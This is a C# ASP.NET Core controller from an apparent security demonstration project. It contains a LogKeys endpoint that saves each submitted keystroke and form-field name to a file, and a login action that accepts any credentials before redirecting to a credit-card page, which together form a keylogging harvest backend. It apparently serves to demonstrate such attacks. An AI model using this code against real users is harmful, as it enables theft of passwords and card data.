using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http; 
using SecurityDemoV1.Models;
using System.Diagnostics;

namespace SecurityDemoV1.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        public IActionResult Login()
        {
            return View();
        }

        [HttpPost]
        public IActionResult LogKeys([FromBody] KeyLogModel keyLog)
        {
            // Ensure the logs directory exists
            string logFilePath = "keylog.txt";
            Directory.CreateDirectory("logs");

            // Format the log entry with field name and keystroke
            string logEntry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Field: {keyLog.Field} - Key Pressed: {keyLog.Keystroke}";

            // Append the log entry to the file
            System.IO.File.AppendAllText(logFilePath, logEntry + Environment.NewLine);

            return Ok();
        }


        public IActionResult CreditCard()
        {
            var username = HttpContext.Session.GetString("Username");
            ViewBag.Username = username;

            return View();
        }

        [HttpPost]
        public IActionResult ValidateLogin(string username, string password)
        {
            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
            {
                HttpContext.Session.SetString("Username", username);
                return RedirectToAction("CreditCard");
            }

            ViewBag.ErrorMessage = "Invalid login credentials. Please try again.";
            return View("Login");
        }
    }
}
